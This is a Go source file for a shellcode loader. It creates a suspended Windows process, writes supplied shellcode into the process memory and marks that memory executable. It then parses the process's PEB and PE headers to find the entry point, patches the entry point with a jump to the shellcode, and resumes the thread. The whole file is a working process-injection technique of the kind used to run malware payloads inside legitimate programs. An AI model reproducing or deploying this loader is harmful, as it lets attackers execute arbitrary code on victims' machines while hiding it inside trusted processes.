package loader

import (
	"encoding/binary"
	"fmt"
	"unsafe"
	"variant/log"
	"variant/xwindows"

	"golang.org/x/sys/windows"
)

func CreateProcessWithPipe(shellcode []byte, program string) error {
	// Create anonymous pipe for STDIN
	var stdInRead windows.Handle
	var stdInWrite windows.Handle

	errStdInPipe := xwindows.CreatePipe(&stdInRead, &stdInWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)
	if errStdInPipe != nil {
		return fmt.Errorf("CreatePipe StdInPipe failed: %w", errStdInPipe)
	}

	// Create anonymous pipe for STDOUT
	var stdOutRead windows.Handle
	var stdOutWrite windows.Handle

	errStdOutPipe := xwindows.CreatePipe(&stdOutRead, &stdOutWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)
	if errStdOutPipe != nil {
		return fmt.Errorf("CreatePipe StdOutPipe failed: %w", errStdOutPipe)
	}

	// Create anonymous pipe for STDERR
	var stdErrRead windows.Handle
	var stdErrWrite windows.Handle

	errStdErrPipe := xwindows.CreatePipe(
		&stdErrRead,
		&stdErrWrite,
		&windows.SecurityAttributes{InheritHandle: 1},
		0,
	)
	if errStdErrPipe != nil {
		return fmt.Errorf("CreatePipe StdErrPipe failed: %w", errStdErrPipe)
	}

	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		StdInput:   stdInRead,
		StdOutput:  stdOutWrite,
		StdErr:     stdErrWrite,
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	errCreateProcess := xwindows.CreateProcessW(
		windows.StringToUTF16Ptr(program),
		nil,
		nil,
		nil,
		true,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		startupInfo,
		procInfo,
	)
	if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
		return fmt.Errorf("CreateProcessW failed: %w", errCreateProcess)
	}

	// Allocate memory in a child process
	addr, errVirtualAlloc := xwindows.VirtualAllocEx(
		procInfo.Process,
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		return fmt.Errorf("VirtualAllocEx failed: %w", errVirtualAlloc)
	}
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx failed and returned 0")
	}

	// Write shellcode into child process memory
	errWriteProcessMemory := xwindows.WriteProcessMemory(
		procInfo.Process,
		addr,
		&shellcode[0],
		uintptr(len(shellcode)),
		nil,
	)
	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		return fmt.Errorf("WriteProcessMemory failed: %w", errWriteProcessMemory)
	}

	// Change memory permissions to RX in a child process where shellcode was written
	oldProtect := windows.PAGE_READWRITE
	errVirtualProtectEx := xwindows.VirtualProtectEx(
		procInfo.Process,
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		(*uint32)(unsafe.Pointer(&oldProtect)),
	)
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		return fmt.Errorf("VirtualProtectEx failed: %w", errVirtualProtectEx)
	}

	var processInformation windows.PROCESS_BASIC_INFORMATION

	ntStatus, errNtQueryInformationProcess := xwindows.NtQueryInformationProcess(
		procInfo.Process,
		0,
		unsafe.Pointer(&processInformation),
		unsafe.Sizeof(processInformation),
		nil,
	)
	if ntStatus != 0 {
		return fmt.Errorf("NtQueryInformationProcess failed: %w", errNtQueryInformationProcess)
	}

	var peb windows.PEB

	errReadProcessMemory1 := xwindows.ReadProcessMemory(
		procInfo.Process,
		uintptr(unsafe.Pointer(processInformation.PebBaseAddress)),
		(*byte)(unsafe.Pointer(&peb)),
		unsafe.Sizeof(peb),
		nil,
	)
	if errReadProcessMemory1 != nil && errReadProcessMemory1.Error() != "The operation completed successfully." {
		return fmt.Errorf("ReadProcessMemory 1 failed: %w", errReadProcessMemory1)
	}

	var dosHeader xwindows.IMAGE_DOS_HEADER

	errReadProcessMemory2 := xwindows.ReadProcessMemory(
		procInfo.Process,
		peb.ImageBaseAddress,
		(*byte)(unsafe.Pointer(&dosHeader)),
		unsafe.Sizeof(dosHeader),
		nil,
	)
	if errReadProcessMemory2 != nil && errReadProcessMemory2.Error() != "The operation completed successfully." {
		return fmt.Errorf("ReadProcessMemory 2 failed: %w", errReadProcessMemory2)
	}

	// 23117 is the LittleEndian unsigned base10 representation of MZ
	// 0x5a4d is the LittleEndian unsigned base16 representation of MZ
	if dosHeader.E_magic != 23117 {
		return fmt.Errorf("DOS image header magic string was not MZ")
	}

	// Read the child process's PE header signature to validate it is a PE
	var Signature uint32

	errReadProcessMemory3 := xwindows.ReadProcessMemory(
		procInfo.Process,
		peb.ImageBaseAddress+uintptr(dosHeader.E_lfanew),
		(*byte)(unsafe.Pointer(&Signature)),
		unsafe.Sizeof(Signature),
		nil,
	)
	if errReadProcessMemory3 != nil && errReadProcessMemory3.Error() != "The operation completed successfully." {
		return fmt.Errorf("ReadProcessMemory 3 failed: %w", errReadProcessMemory3)
	}

	// 17744 is Little Endian Unsigned 32-bit integer in decimal for PE (null terminated)
	// 0x4550 is Little Endian Unsigned 32-bit integer in hex for PE (null terminated)
	if Signature != 17744 {
		return fmt.Errorf("PE Signature string was not PE")
	}

	var peHeader xwindows.IMAGE_FILE_HEADER

	errReadProcessMemory4 := xwindows.ReadProcessMemory(
		procInfo.Process,
		peb.ImageBaseAddress+uintptr(dosHeader.E_lfanew)+unsafe.Sizeof(Signature),
		(*byte)(unsafe.Pointer(&peHeader)),
		unsafe.Sizeof(peHeader),
		nil,
	)
	if errReadProcessMemory4 != nil && errReadProcessMemory4.Error() != "The operation completed successfully." {
		return fmt.Errorf("ReadProcessMemory 4 failed: %w", errReadProcessMemory4)
	}

	var optHeader64 xwindows.IMAGE_OPTIONAL_HEADER64
	var optHeader32 xwindows.IMAGE_OPTIONAL_HEADER32
	var errReadProcessMemory5 error

	if peHeader.Machine == 34404 { // 0x8664
		errReadProcessMemory5 = xwindows.ReadProcessMemory(
			procInfo.Process,
			peb.ImageBaseAddress+uintptr(dosHeader.E_lfanew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), (*byte)(unsafe.Pointer(&optHeader64)),
			unsafe.Sizeof(optHeader64),
			nil,
		)
	} else if peHeader.Machine == 332 { // 0x14c
		errReadProcessMemory5 = xwindows.ReadProcessMemory(
			procInfo.Process,
			peb.ImageBaseAddress+uintptr(dosHeader.E_lfanew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), (*byte)(unsafe.Pointer(&optHeader32)),
			unsafe.Sizeof(optHeader32),
			nil,
		)
	} else {
		return fmt.Errorf("unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine)
	}

	if errReadProcessMemory5 != nil && errReadProcessMemory5.Error() != "The operation completed successfully." {
		return fmt.Errorf("ReadProcessMemory 5 failed: %w", errReadProcessMemory5)
	}

	var ep uintptr
	if peHeader.Machine == 34404 { // 0x8664 x64
		ep = peb.ImageBaseAddress + uintptr(optHeader64.AddressOfEntryPoint)
	} else if peHeader.Machine == 332 { // 0x14c x86
		ep = peb.ImageBaseAddress + uintptr(optHeader32.AddressOfEntryPoint)
	} else {
		return fmt.Errorf("unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine)
	}

	var epBuffer []byte
	var shellcodeAddressBuffer []byte
	// x86 - 0xb8 = mov eax
	// x64 - 0x48 = rex (declare 64bit); 0xb8 = mov eax
	if peHeader.Machine == 34404 { // 0x8664 x64
		epBuffer = append(epBuffer, byte(0x48))
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 8) // 8 bytes for 64-bit address
		binary.LittleEndian.PutUint64(shellcodeAddressBuffer, uint64(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	} else if peHeader.Machine == 332 { // 0x14c x86
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 4) // 4 bytes for 32-bit address
		binary.LittleEndian.PutUint32(shellcodeAddressBuffer, uint32(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	} else {
		return fmt.Errorf("unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine)
	}

	// 0xff ; 0xe0 = jmp [r|e]ax
	epBuffer = append(epBuffer, byte(0xff))
	epBuffer = append(epBuffer, byte(0xe0))

	errWriteProcessMemory2 := xwindows.WriteProcessMemory(
		procInfo.Process,
		ep,
		&epBuffer[0],
		uintptr(len(epBuffer)),
		nil,
	)
	if errWriteProcessMemory2 != nil && errWriteProcessMemory2.Error() != "The operation completed successfully." {
		return fmt.Errorf("WriteProcessMemory 2 failed: %w", errWriteProcessMemory2)
	}

	// Resume the child process
	_, errResumeThread := xwindows.ResumeThread(procInfo.Thread)
	if errResumeThread != nil {
		return fmt.Errorf("ResumeThread failed: %w", errResumeThread)
	}

	// Close the handle to the child process
	errCloseProcHandle := xwindows.CloseHandle(procInfo.Process)
	if errCloseProcHandle != nil {
		return fmt.Errorf("CloseProcHandle failed: %w", errCloseProcHandle)
	}

	// Close the hand to the child process thread
	errCloseThreadHandle := xwindows.CloseHandle(procInfo.Thread)
	if errCloseThreadHandle != nil {
		return fmt.Errorf("CloseThreadHandle failed: %w", errCloseThreadHandle)
	}

	// Close the write handle the anonymous STDOUT pipe
	errCloseStdOutWrite := xwindows.CloseHandle(stdOutWrite)
	if errCloseStdOutWrite != nil {
		return fmt.Errorf("CloseStdOutWrite failed: %w", errCloseStdOutWrite)
	}

	// Close the read handle to the anonymous STDIN pipe
	errCloseStdInRead := xwindows.CloseHandle(stdInRead)
	if errCloseStdInRead != nil {
		return fmt.Errorf("CloseStdInRead failed: %w", errCloseStdInRead)
	}

	// Close the written handle to the anonymous STDERR pipe
	errCloseStdErrWrite := xwindows.CloseHandle(stdErrWrite)
	if errCloseStdErrWrite != nil {
		return fmt.Errorf("CloseStdErrWrite failed: %w", errCloseStdErrWrite)
	}

	nNumberOfBytesToRead := make([]byte, 1)
	var stdOutBuffer []byte
	var stdOutDone uint32
	var stdOutOverlapped windows.Overlapped

	for {
		errReadFileStdOut := windows.ReadFile(
			stdOutRead,
			nNumberOfBytesToRead,
			&stdOutDone,
			&stdOutOverlapped,
		)
		if errReadFileStdOut != nil && errReadFileStdOut.Error() != "The pipe has been ended." {
			return fmt.Errorf("Error reading from STDOUT pipe:\r\n\t%s", errReadFileStdOut.Error())
		}

		if int(stdOutDone) == 0 {
			break
		}
		for _, b := range nNumberOfBytesToRead {
			stdOutBuffer = append(stdOutBuffer, b)
		}
	}

	// Read STDERR from a child process
	var stdErrBuffer []byte
	var stdErrDone uint32
	var stdErrOverlapped windows.Overlapped

	for {
		errReadFileStdErr := windows.ReadFile(
			stdErrRead,
			nNumberOfBytesToRead,
			&stdErrDone,
			&stdErrOverlapped,
		)
		if errReadFileStdErr != nil && errReadFileStdErr.Error() != "The pipe has been ended." {
			return fmt.Errorf("Error reading from STDOUT pipe:\r\n\t%s", errReadFileStdErr.Error())
		}

		if int(stdErrDone) == 0 {
			break
		}
		for _, b := range nNumberOfBytesToRead {
			stdErrBuffer = append(stdErrBuffer, b)
		}
	}

	// Write the data collected from the childprocess' STDOUT to the parent process' STOUTOUT
	if len(stdOutBuffer) > 0 {
		log.Infof(fmt.Sprintf("[+]Child process STDOUT:\r\n%s", string(stdOutBuffer)))
	}
	if len(stdErrBuffer) > 0 {
		log.Infof(fmt.Sprintf("[!]Child process STDERR:\r\n%s", string(stdErrBuffer)))
	}

	return nil
}
